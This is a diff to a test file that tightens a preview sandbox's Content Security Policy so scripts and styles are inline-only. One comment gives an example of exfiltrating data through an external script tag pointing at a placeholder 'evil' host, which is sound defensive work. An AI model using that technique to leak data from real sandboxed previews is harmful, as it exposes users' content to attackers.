@@ -7,13 +7,27 @@ import {
 } from "@/lib/previewSandbox";
 
 describe("PREVIEW_CSP", () => {
-  it("blocks network egress and forms, allows inline scripts", () => {
+  it("blocks network egress and forms, allows inline scripts only", () => {
     expect(PREVIEW_CSP).toContain("default-src 'none'");
-    expect(PREVIEW_CSP).toContain("script-src 'unsafe-inline' https:");
+    expect(PREVIEW_CSP).toContain("script-src 'unsafe-inline'");
+    expect(PREVIEW_CSP).toContain("style-src 'unsafe-inline'");
     expect(PREVIEW_CSP).toContain("connect-src 'none'");
     expect(PREVIEW_CSP).toContain("form-action 'none'");
     expect(PREVIEW_CSP).toContain("base-uri 'none'");
     expect(PREVIEW_CSP).toContain("sandbox allow-scripts");
+  });
+
+  it("blocks https on script/style (external script-src exfiltration)", () => {
+    // connect-src 'none' alone is not enough: <script src="https://evil/?…">
+    // still fires a GET. Inline-only preview — no CDN hosts.
+    const scriptSrc = PREVIEW_CSP.match(/script-src\s+([^;]+)/)?.[1].trim();
+    const styleSrc = PREVIEW_CSP.match(/style-src\s+([^;]+)/)?.[1].trim();
+    expect(scriptSrc).toBe("'unsafe-inline'");
+    expect(styleSrc).toBe("'unsafe-inline'");
+    for (const value of [scriptSrc, styleSrc]) {
+      expect(value).not.toContain("https:");
+      expect(value).not.toContain("*");
+    }
   });
 
   it("blocks https on img/font/media (passive GET exfiltration)", () => {
@@ -44,7 +58,8 @@ describe("PDF_PREVIEW_CSP", () => {
 
   it("keeps the rest of the policy as locked-down as PREVIEW_CSP", () => {
     expect(PDF_PREVIEW_CSP).toContain("default-src 'none'");
-    expect(PDF_PREVIEW_CSP).toContain("script-src 'unsafe-inline' https:");
+    expect(PDF_PREVIEW_CSP).toContain("script-src 'unsafe-inline'");
+    expect(PDF_PREVIEW_CSP).not.toContain("script-src 'unsafe-inline' https:");
     expect(PDF_PREVIEW_CSP).toContain("form-action 'none'");
     expect(PDF_PREVIEW_CSP).toContain("base-uri 'none'");
     expect(PDF_PREVIEW_CSP).toContain("sandbox allow-scripts");
